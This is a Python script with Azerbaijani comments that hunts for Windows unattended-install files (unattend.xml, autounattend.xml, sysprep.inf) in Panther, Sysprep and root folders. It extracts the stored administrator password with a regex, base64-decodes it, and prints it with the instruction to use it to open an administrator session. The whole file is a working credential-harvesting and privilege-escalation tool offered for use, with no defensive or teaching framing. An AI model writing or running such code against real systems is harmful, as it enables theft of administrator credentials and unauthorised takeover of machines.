import os
import re
import base64

# 1. Axtarılacaq standart qovluqlar və fayl adları
target_directories = [
    r"C:\Windows\Panther",
    r"C:\Windows\Panther\Unattend",
    r"C:\Windows\System32\Sysprep",
    r"C:\\"
]

target_files = [
    "unattend.xml",
    "autounattend.xml",
    "sysprep.inf"
]

# <AdministratorPassword> daxilindəki <Value> teqini tutmaq üçün Regex şablonu
password_regex = re.compile(r"<Value>(.*?)</Value>", re.IGNORECASE)

def scan_and_extract():
    print("[*] Həssas quraşdırma faylları axtarılır...")
    
    for directory in target_directories:
        if not os.path.exists(directory):
            continue
            
        for file_name in target_files:
            full_path = os.path.join(directory, file_name)
            
            if os.path.exists(full_path):
                print(f"[+] Fayl tapıldı: {full_path}")
                try:
                    with open(full_path, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                        
                        # Regex ilə parolun axtarılması
                        match = password_regex.search(content)
                        if match:
                            encoded_password = match.group(1)
                            print(f"[+] Kodlaşdırılmış parol tapıldı: {encoded_password}")
                            
                            # 3. Base64 formatından dekod edilməsi
                            try:
                                decoded_password = base64.b64decode(encoded_password).decode("utf-8")
                                print(f"[!] DEKOD EDİLMİŞ PAROL: {decoded_password}")
                                return decoded_password
                            except Exception as decode_err:
                                # Əgər parol şifrələnməyib birbaşa yazılıbsa (plaintext)
                                print(f"[!] Dekod edilə bilmədi (Ehtimal ki, Plaintext-dir): {encoded_password}")
                                return encoded_password
                except Exception as file_err:
                    print(f"[-] Faylı oxumaq mümkün olmadı {full_path}: {file_err}")
                    
    print("[-] Heç bir faylda parol tapılmadı.")
    return None

if __name__ == "__main__":
    admin_password = scan_and_extract()
    if admin_password:
        print("\n[*] Növbəti addım:")
        print(f"İnzibatçı sessiyası açmaq üçün bu parolu istifadə edin: {admin_password}")
